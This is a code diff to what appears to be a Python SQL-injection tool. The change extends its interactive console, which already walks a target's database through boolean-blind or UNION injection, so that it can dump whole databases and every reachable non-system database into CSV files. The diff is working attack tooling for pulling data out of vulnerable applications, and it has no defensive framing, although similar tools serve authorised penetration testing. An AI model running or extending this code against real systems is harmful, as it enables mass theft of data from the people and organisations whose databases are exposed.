@@ -180,12 +180,21 @@ def cmd_eights(args) -> None:
     _console(args).eights()
 
 
-_SQL_HELP = """  walk the database (boolean-blind):
-  banner                DBMS version          user / db           current user / database
-  databases             list databases        tables              list tables
-  columns <table>       a table's columns     dump <table>        dump one table's rows
-  dump-all (dump *)     dump every table      query "<SELECT>"    extract one value
-  help / exit           this / quit
+_SQL_HELP = """  walk the database:
+    banner                  the DBMS and its version
+    user                    the current database user
+    db                      the current database
+    databases               list the databases
+    tables                  list the current database's tables
+    columns <table>         a table's columns
+    query "<SELECT ...>"    extract one value
+
+  dump:
+    dump table <name>       one table's rows                  → CSV
+    dump database [<name>]  every table in a database          (current if no name)
+    dump all                every reachable database
+
+  help / exit               this help · quit the console
 """
 
 
@@ -331,7 +340,7 @@ def cmd_sql(args) -> None:
         else:
             with c.working("reading the databases", lambda: oracle.count):
                 _overview(c, oracle, prof, union)    # exploration context — REPL only
-            _sql_repl(c, oracle, prof, union, args.output)
+            _sql_repl(c, oracle, prof, dbms, union, args.output)
     finally:
         oracle.cache.close()
 
@@ -437,38 +446,106 @@ def _walk_dump(oracle, prof, union, table, console=None):
     return cols, rows
 
 
-def _do_dump(c, oracle, prof, union, table, out_dir) -> int:
+def _current_db(oracle, prof, union):
+    try:
+        return (_walk_scalar(oracle, prof, union, prof["db"]) or "").strip() or None
+    except Exception:
+        return None
+
+
+def _tables_in(c, oracle, prof, union, db):
+    """Tables of database `db`; with `db` None it's the current database (and the
+    rich common-name fallback applies). A named database uses the scoped catalog."""
+    if db is None:
+        return _tables(c, oracle, prof, union)
+    if union:
+        tbls = [t for t in sqli.union_tables(oracle.http, oracle, *union, db=db) if t]
+    else:
+        tbls = [t for t in sqli.tables(oracle, prof) if t]      # prof already scoped to db
+    if not tbls:
+        c.warn(f"no tables enumerated in '{db}' — the catalog may be filtered or empty")
+    return tbls
+
+
+def _columns_in(c, oracle, prof, union, table, db):
+    if db is None:
+        return _columns(c, oracle, prof, union, table)
+    if union:
+        return [x for x in sqli.union_columns(oracle.http, oracle, *union, table, db=db) if x]
+    return [x for x in sqli.columns(oracle, prof, table) if x]   # prof already scoped
+
+
+def _do_dump(c, oracle, prof, union, table, out_dir, db=None, save_label=None) -> int:
     """Dump one table end to end: pull every row, print it, save a CSV. Prints and
-    saves whatever was pulled even if the walk is interrupted. Returns the count."""
-    cols, rowgen = _walk_dump(oracle, prof, union, table, console=c)
+    saves whatever was pulled even if the walk is interrupted. Returns the count.
+    `db` scopes the read to another database; `save_label` namespaces the CSV."""
+    cols = _columns_in(c, oracle, prof, union, table, db)
+    if union:
+        rowgen = sqli.union_dump(oracle.http, oracle, *union, table, cols, db=db)
+    else:
+        rowgen = sqli.dump(oracle, prof, table, cols)           # prof already scoped
     rows = []
     try:
         for r in rowgen:
             rows.append(r)
     finally:
         _print_table(c, cols, rows)
-        _save_dump(c, oracle, table, cols, rows, out_dir)
+        _save_dump(c, oracle, f"{save_label}.{table}" if save_label else table, cols, rows, out_dir)
     return len(rows)
 
 
-def _dump_all(c, oracle, prof, union, out_dir) -> None:
-    """Dump the whole database — every table in turn. Ctrl-C stops the sweep but
-    keeps (and saves) everything pulled up to that point."""
-    tbls = _tables(c, oracle, prof, union)
+def _dump_database(c, oracle, prof, dbms, union, db, out_dir, header=True) -> int:
+    """Dump every table of one database. `db` None means the current database; a
+    named database is reached via the scoped catalog where the engine allows it."""
+    cur = _current_db(oracle, prof, union)
+    target = None if (db is None or db == cur) else db
+    if target and not sqli.cross_db_supported(dbms):
+        c.warn(f"only the current database ('{cur or 'current'}') is reachable from this "
+               f"injection point on {dbms} — can't cross over to '{db}'")
+        return 0
+    sprof = sqli.scoped_profile(prof, dbms, target)             # target None → prof unchanged
+    label = db or cur or "current"
+    tbls = _tables_in(c, oracle, sprof, union, target)
     if not tbls:
-        c.warn("no tables to dump")
-        return
-    c.good(f"dumping every table ({len(tbls)}): {', '.join(tbls)}")
+        return 0
+    if header:
+        c.good(f"database {label} — dumping {len(tbls)} table(s): {', '.join(tbls)}")
     total = 0
     for t in tbls:
         c.plain("")
-        c.good(f"— {t} —")
+        c.good(f"— {label}.{t} —")
         try:
-            total += _do_dump(c, oracle, prof, union, t, out_dir)
+            total += _do_dump(c, oracle, sprof, union, t, out_dir, db=target,
+                              save_label=(label if target else None))
         except KeyboardInterrupt:
             c.warn(f"interrupted on {t} — stopping the sweep (kept what was pulled)")
             break
-    c.good(f"dumped {total} row(s) across the database")
+    return total
+
+
+def _dump_all(c, oracle, prof, dbms, union, out_dir) -> None:
+    """Dump every reachable database. On engines that can't cross databases from one
+    injection point (SQLite, Postgres) that's the current database; on MySQL/MSSQL it's
+    every non-system database. Ctrl-C stops the sweep, keeping what was pulled."""
+    dbs = []
+    if sqli.cross_db_supported(dbms):
+        sysdbs = sqli.SYSTEM_DBS.get(dbms, set())
+        dbs = [d for d in _databases(oracle, prof, union) if d and d not in sysdbs]
+    if not dbs:                          # single reachable database, or empty catalog
+        total = _dump_database(c, oracle, prof, dbms, union, None, out_dir)
+        c.good(f"dumped {total} row(s)")
+        return
+    c.good(f"dumping {len(dbs)} database(s): {', '.join(dbs)}")
+    grand = 0
+    for d in dbs:
+        c.plain("")
+        c.good(f"════ database {d} ════")
+        try:
+            grand += _dump_database(c, oracle, prof, dbms, union, d, out_dir)
+        except KeyboardInterrupt:
+            c.warn(f"interrupted during '{d}' — stopping the sweep")
+            break
+    c.good(f"dumped {grand} row(s) across {len(dbs)} database(s)")
 
 
 def _save_dump(c, oracle, table, cols, rows, out_dir=None) -> None:
@@ -493,7 +570,7 @@ def _print_table(c, cols, rows) -> None:
         c.plain("  " + " | ".join(cell(r, i).ljust(widths[i]) for i in range(len(cols))))
 
 
-def _sql_repl(c, oracle, prof, union, out_dir=None) -> None:
+def _sql_repl(c, oracle, prof, dbms, union, out_dir=None) -> None:
     c.plain(_SQL_HELP)
     while True:
         try:
@@ -536,16 +613,22 @@ def _sql_repl(c, oracle, prof, union, out_dir=None) -> None:
                     continue
                 for col in _columns(c, oracle, prof, union, arg):
                     c.plain(f"  {col}")
-            elif cmd in ("dump-all", "dumpall", "dump-db", "dumpdb"):
-                _dump_all(c, oracle, prof, union, out_dir)
             elif cmd == "dump":
+                sub, _, rest = arg.partition(" ")
+                sub, rest = sub.lower(), rest.strip()
                 if not arg:
-                    c.warn("usage: dump <table>   (or `dump *` / `dump-all` for the whole database)")
-                    continue
-                if arg.lower() in ("*", "all", "db", "database", "everything"):
-                    _dump_all(c, oracle, prof, union, out_dir)
+                    c.warn("usage: dump table <name> | dump database [<name>] | dump all")
+                elif sub == "all":
+                    _dump_all(c, oracle, prof, dbms, union, out_dir)
+                elif sub == "database":
+                    _dump_database(c, oracle, prof, dbms, union, rest or None, out_dir)
+                elif sub == "table":
+                    if not rest:
+                        c.warn("usage: dump table <name>")
+                    else:
+                        _do_dump(c, oracle, prof, union, rest, out_dir)
                 else:
-                    _do_dump(c, oracle, prof, union, arg, out_dir)   # prints + saves inside
+                    _do_dump(c, oracle, prof, union, arg, out_dir)   # `dump <table>` shorthand
             elif cmd == "query":
                 if not arg:
                     c.warn('usage: query "<SELECT returning one value>"')
